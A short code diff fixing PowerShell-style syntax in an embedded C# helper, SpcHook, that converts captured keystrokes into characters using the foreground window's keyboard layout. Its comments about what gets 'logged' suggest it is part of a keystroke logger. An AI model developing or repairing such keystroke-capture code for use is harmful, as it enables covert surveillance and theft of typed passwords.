@@ -86,17 +86,17 @@ public static class SpcHook {
         // layout symbol (@, €, ~). Ctrl alone stays unmarked so Ctrl+C logs
         // "c" instead of ETX; Alt alone is marked for menu accelerators.
         if (altGr) {
-            state[0x11] = 0x80
-            state[0x12] = 0x80
-        } elseif ($alt) {
-            state[0x12] = 0x80
+            state[0x11] = 0x80;
+            state[0x12] = 0x80;
+        } else if (alt) {
+            state[0x12] = 0x80;
         }
         uint pid;
         uint thread = GetWindowThreadProcessId(GetForegroundWindow(), out pid);
         IntPtr layout = GetKeyboardLayout(thread);
         StringBuilder text = new StringBuilder(8);
         int count = ToUnicodeEx(vk, scan, state, text, text.Capacity, 0, layout);
-        LastDead = count -lt 0;
+        LastDead = count < 0;
         return count > 0 ? text.ToString(0, count) : "";
     }
 }
